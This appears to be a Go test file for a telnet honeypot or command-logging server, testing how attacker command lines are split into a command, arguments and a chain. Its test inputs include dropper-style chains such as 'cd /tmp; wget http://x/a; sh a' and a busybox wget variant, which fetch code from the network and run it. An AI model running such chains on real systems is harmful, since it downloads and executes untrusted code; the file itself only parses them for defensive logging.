package server

import (
	"reflect"
	"testing"
)

func TestParseCommandLine(t *testing.T) {
	cases := []struct {
		in        string
		wantCmd   string
		wantArgs  []string
		wantChain []string
	}{
		{"/bin/./uname -a", "uname", []string{"-a"}, []string{"uname"}},
		{"cd /tmp; wget http://x/a; sh a", "cd", []string{"/tmp"}, []string{"cd", "wget", "sh"}},
		{"", "", []string{}, []string{}},
	}
	for _, tc := range cases {
		cmd, args, chain := parseCommandLine(tc.in)
		if cmd != tc.wantCmd || !reflect.DeepEqual(args, tc.wantArgs) || !reflect.DeepEqual(chain, tc.wantChain) {
			t.Errorf("parseCommandLine(%q) = %q %q %q, want %q %q %q",
				tc.in, cmd, args, chain, tc.wantCmd, tc.wantArgs, tc.wantChain)
		}
	}
}

func TestTelnetCommandRecordsChain(t *testing.T) {
	c := telnetCommand("cd /tmp; /bin/busybox wget x", "/root", "", 0, nil, 1)
	if c.ParsedCommand != "cd" || !reflect.DeepEqual(c.CommandChain, []string{"cd", "busybox"}) {
		t.Fatalf("got %q %q", c.ParsedCommand, c.CommandChain)
	}
}
